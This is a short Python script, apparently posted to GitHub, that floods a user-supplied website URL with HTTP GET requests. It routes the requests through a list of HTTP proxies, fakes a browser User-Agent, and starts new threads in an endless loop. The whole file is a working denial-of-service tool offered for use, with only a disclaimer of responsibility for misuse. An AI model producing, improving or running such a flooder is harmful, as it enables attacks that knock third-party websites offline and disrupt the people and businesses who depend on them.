#!/usr/bin/python3
import requests, threading, os, readline, optparse
from colorama import Fore

read = optparse.OptionParser()
read.add_option('-u', '--url',help="Enter Website url", dest='url')
(value, key) = read.parse_args()
url = value.url
if url is None:
 print("Coded by: Anikin Luke Abales")
 print("github: https://github.com/abalesluke")
 print("Note: i am no longer responsible for any misuse of this tool!.")
 print(f"\nTip: before executing this code you can also use -u flag\neg.[python3 {__file__} -u <url>]\n")
 url = input('Enter url: ')
else:
 pass

proxy = open('http_proxies.txt', 'r')
proxieslist = proxy.readlines()

count = 0

def flood():
 try:
  header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
  for x in proxieslist:
   proxiez = {'http':'http:'+str(x),'https':'http:'+str(x)}
   r = requests.get(url, proxies=proxiez, headers=header)
   global count
   count+=1
   print(f'{Fore.GREEN}[{Fore.CYAN}{count}{Fore.GREEN}] {Fore.CYAN}request/s sent to: {Fore.GREEN}{url} [{Fore.MAGENTA}{r.status_code}{Fore.GREEN}]')
 except:
  pass


while True:
 try:
  threading.Thread(target=flood).start()
 except:
  print('\nexiting..')
  exit(0)
